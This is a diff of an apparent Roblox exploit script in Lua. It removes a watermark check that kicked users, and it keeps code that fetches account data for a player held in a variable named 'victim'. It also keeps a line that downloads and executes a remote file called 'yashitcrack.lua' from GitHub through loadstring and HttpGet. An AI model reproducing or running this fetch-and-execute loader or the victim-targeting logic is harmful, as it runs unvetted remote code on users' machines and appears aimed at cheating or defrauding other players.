@@ -17,12 +17,6 @@ repeat task.wait() until game:IsLoaded()
 local Players = game:GetService("Players")
 local friend = cfg.helper ~= "" and Players:WaitForChild(helper) or Players.LocalPlayer
 
--- check for watermark --
-if join ~= "discord.gg/rivalscomp" then
-    Players.LocalPlayer:Kick("don't remove the discord.gg/rivalscomp watermark please")
-    return
-end
-
 -- sets user data --
 local UserData = game:HttpGet("https://users.roblox.com/v1/users/" .. tostring(victim), true)
 local decodedData = game:GetService("HttpService"):JSONDecode(UserData)
@@ -191,4 +185,5 @@ if unlockall then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/yashitcrack.lua"))()
 
 end
+
 
